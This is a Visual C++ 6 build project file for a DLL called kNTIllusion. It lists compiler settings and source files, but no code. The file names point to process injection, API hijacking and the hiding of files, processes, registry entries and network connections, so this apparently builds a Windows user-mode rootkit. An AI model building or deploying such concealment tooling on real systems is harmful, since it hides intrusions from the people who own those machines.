# Microsoft Developer Studio Project File - Name="kNTIllusion" - Package Owner=<4>
# Microsoft Developer Studio Generated Build File, Format Version 6.00
# ** DO NOT EDIT **

# TARGTYPE "Win32 (x86) Dynamic-Link Library" 0x0102

CFG=kNTIllusion - Win32 Debug
!MESSAGE This is not a valid makefile. To build this project using NMAKE,
!MESSAGE use the Export Makefile command and run
!MESSAGE 
!MESSAGE NMAKE /f "kNTIllusion.mak".
!MESSAGE 
!MESSAGE You can specify a configuration when running NMAKE
!MESSAGE by defining the macro CFG on the command line. For example:
!MESSAGE 
!MESSAGE NMAKE /f "kNTIllusion.mak" CFG="kNTIllusion - Win32 Debug"
!MESSAGE 
!MESSAGE Possible choices for configuration are:
!MESSAGE 
!MESSAGE "kNTIllusion - Win32 Release" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE "kNTIllusion - Win32 Debug" (based on "Win32 (x86) Dynamic-Link Library")
!MESSAGE 

# Begin Project
# PROP AllowPerConfigDependencies 0
# PROP Scc_ProjName ""
# PROP Scc_LocalPath ""
CPP=cl.exe
MTL=midl.exe
RSC=rc.exe

!IF  "$(CFG)" == "kNTIllusion - Win32 Release"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 0
# PROP BASE Output_Dir "Release"
# PROP BASE Intermediate_Dir "Release"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 0
# PROP Output_Dir "Release"
# PROP Intermediate_Dir "Release"
# PROP Ignore_Export_Lib 1
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MT /W3 /GX /O2 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "KNTILLUSION_EXPORTS" /Yu"stdafx.h" /FD /c
# ADD CPP /nologo /MT /W3 /GX /O1 /D "WIN32" /D "NDEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "KNTILLUSION_EXPORTS" /FD /c
# SUBTRACT CPP /YX /Yc /Yu
# ADD BASE MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "NDEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x40c /d "NDEBUG"
# ADD RSC /l 0x40c /d "NDEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /machine:I386
# ADD LINK32 kernel32.lib user32.lib /nologo /dll /machine:I386 /out:"../Release/kNTIllusion.dll"
# SUBTRACT LINK32 /verbose /profile /incremental:yes /nodefaultlib

!ELSEIF  "$(CFG)" == "kNTIllusion - Win32 Debug"

# PROP BASE Use_MFC 0
# PROP BASE Use_Debug_Libraries 1
# PROP BASE Output_Dir "Debug"
# PROP BASE Intermediate_Dir "Debug"
# PROP BASE Target_Dir ""
# PROP Use_MFC 0
# PROP Use_Debug_Libraries 1
# PROP Output_Dir "Debug"
# PROP Intermediate_Dir "Debug"
# PROP Ignore_Export_Lib 0
# PROP Target_Dir ""
# ADD BASE CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "KNTILLUSION_EXPORTS" /Yu"stdafx.h" /FD /GZ /c
# ADD CPP /nologo /MTd /W3 /Gm /GX /ZI /Od /D "WIN32" /D "_DEBUG" /D "_WINDOWS" /D "_MBCS" /D "_USRDLL" /D "KNTILLUSION_EXPORTS" /Yu"stdafx.h" /FD /GZ /c
# ADD BASE MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD MTL /nologo /D "_DEBUG" /mktyplib203 /win32
# ADD BASE RSC /l 0x40c /d "_DEBUG"
# ADD RSC /l 0x40c /d "_DEBUG"
BSC32=bscmake.exe
# ADD BASE BSC32 /nologo
# ADD BSC32 /nologo
LINK32=link.exe
# ADD BASE LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /debug /machine:I386 /pdbtype:sept
# ADD LINK32 kernel32.lib user32.lib gdi32.lib winspool.lib comdlg32.lib advapi32.lib shell32.lib ole32.lib oleaut32.lib uuid.lib odbc32.lib odbccp32.lib /nologo /dll /debug /machine:I386 /pdbtype:sept

!ENDIF 

# Begin Target

# Name "kNTIllusion - Win32 Release"
# Name "kNTIllusion - Win32 Debug"
# Begin Group "Source Files"

# PROP Default_Filter "cpp;c;cxx;rc;def;r;odl;idl;hpj;bat"
# Begin Source File

SOURCE=.\Core\Misc\kdbg_IAT.c
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Stealth\kDllHideEng.c
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Hijacking\kDisAsm\kEPhook.c
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Hijacking\kHijackEng.c
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Injection\kInjectEng.c
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Files\kNTIFiles.c
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Network\kNTIFlow.c
# End Source File
# Begin Source File

SOURCE=.\Core\Misc\kNTILib.c
# End Source File
# Begin Source File

SOURCE=.\Core\kNTIllusion.c
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Network\kNTINetHide.c
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Process\kNTIProcess.c
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Registry\kNTIReg.c
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Spawning\kNTISpawn.c
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Injection\kSetWindowsHook.c
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Hijacking\kDisAsm\ZDisasm.c
# End Source File
# End Group
# Begin Group "Header Files"

# PROP Default_Filter "h;hpp;hxx;hm;inl"
# Begin Source File

SOURCE=.\Core\Misc\AggressiveOptimize.h
# End Source File
# Begin Source File

SOURCE=.\Core\Misc\kdbg_IAT.h
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Stealth\kDllHideEng.h
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Hijacking\kDisAsm\kEPhook.h
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Hijacking\kHijackEng.h
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Injection\kInjectEng.h
# End Source File
# Begin Source File

SOURCE=.\Core\Misc\kNTIConfig.h
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Files\kNTIFiles.h
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Network\kNTIFlow.h
# End Source File
# Begin Source File

SOURCE=.\Core\Misc\kNTILib.h
# End Source File
# Begin Source File

SOURCE=.\Core\kNTIllusion.h
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Network\kNTINetHide.h
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Process\kNTIProcess.h
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Registry\kNTIReg.h
# End Source File
# Begin Source File

SOURCE=.\Core\Replacements\Spawning\kNTISpawn.h
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Stealth\kPEBStruct.h
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Injection\kSetWindowsHook.h
# End Source File
# Begin Source File

SOURCE=.\Core\Engine\Hijacking\kDisAsm\ZDisasm.h
# End Source File
# End Group
# End Target
# End Project
